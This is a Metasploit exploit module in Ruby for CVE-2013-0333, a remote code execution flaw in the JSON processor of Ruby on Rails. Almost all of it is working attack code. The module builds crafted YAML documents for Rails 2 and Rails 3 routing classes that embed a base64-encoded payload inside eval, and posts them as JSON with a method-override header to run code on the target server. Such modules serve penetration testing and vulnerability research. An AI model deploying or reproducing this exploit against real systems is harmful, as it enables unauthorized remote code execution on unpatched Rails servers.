# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Ruby on Rails JSON Processor YAML Deserialization Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a remote code execution vulnerability in the
                JSON request processor of the Ruby on Rails application framework.
                This vulnerability allows an attacker to instantiate a remote object,
                which in turn can be used to execute any ruby code remotely in the
                context of the application. This vulnerability is very similar to
                CVE-2013-0156.
 
                This module has been tested successfully on RoR 3.0.9, 3.0.19, and
                2.3.15.
 
                The technique used by this module requires the target to be running a
                fairly recent version of Ruby 1.9 (since 2011 or so). Applications
                using Ruby 1.8 may still be exploitable using the init_with() method,
                but this has not been demonstrated.
 
            },
            &#039;Author&#039;         =>
                [
                    &#039;jjarmoc&#039;,  # Initial module based on cve-2013-0156, testing help
                    &#039;egypt&#039;,    # Module
                    &#039;lian&#039;,     # Identified the RouteSet::NamedRouteCollection vector
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;  =>
                [
                    [&#039;CVE&#039;, &#039;2013-0333&#039;],
                ],
            &#039;Platform&#039;       => &#039;ruby&#039;,
            &#039;Arch&#039;           => ARCH_RUBY,
            &#039;Privileged&#039;     => false,
            &#039;Targets&#039;        =>  [ [&#039;Automatic&#039;, {} ] ],
            &#039;DisclosureDate&#039; => &#039;Jan 28 2013&#039;,
            &#039;DefaultOptions&#039; => { "PrependFork" => true },
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                Opt::RPORT(80),
                OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, "/"]),
                OptString.new(&#039;HTTP_METHOD&#039;, [ true, &#039;The HTTP request method (GET, POST, PUT typically work)&#039;, "POST"])
 
            ], self.class)
 
    end
 
    #
    # Create the YAML document that will be embedded into the JSON
    #
    def build_yaml_rails2
 
        code = Rex::Text.encode_base64(payload.encoded)
        yaml =
            "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n" +
            "&#039;#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
            "eval(%[#{code}].unpack(%[m0])[0]);&#039; " +
            ": !ruby/object:ActionController::Routing::Route\n segments: []\n requirements:\n   " +
            ":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\n     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: " +
            ":#{Rex::Text.rand_text_alpha(rand(8)+1)}\n"
        yaml.gsub(&#039;:&#039;, &#039;\u003a&#039;)
    end
 
 
    #
    # Create the YAML document that will be embedded into the JSON
    #
    def build_yaml_rails3
 
        code = Rex::Text.encode_base64(payload.encoded)
        yaml =
            "--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\n" +
            "&#039;#{Rex::Text.rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);&#039; " +
            ": !ruby/object:OpenStruct\n table:\n  :defaults: {}\n"
        yaml.gsub(&#039;:&#039;, &#039;\u003a&#039;)
    end
 
    def build_request(v)
        case v
        when 2; build_yaml_rails2
        when 3; build_yaml_rails3
        end
    end
 
    #
    # Send the actual request
    #
    def exploit
 
        [2, 3].each do |ver|
            print_status("Sending Railsv#{ver} request to #{rhost}:#{rport}...")
            send_request_cgi({
                &#039;uri&#039;     => normalize_uri(target_uri.path),
                &#039;method&#039;  => datastore[&#039;HTTP_METHOD&#039;],
                &#039;ctype&#039;   => &#039;application/json&#039;,
                &#039;headers&#039; => { &#039;X-HTTP-Method-Override&#039; => &#039;get&#039; },
                &#039;data&#039;    => build_request(ver)
            }, 25)
            handler
        end
 
    end
end

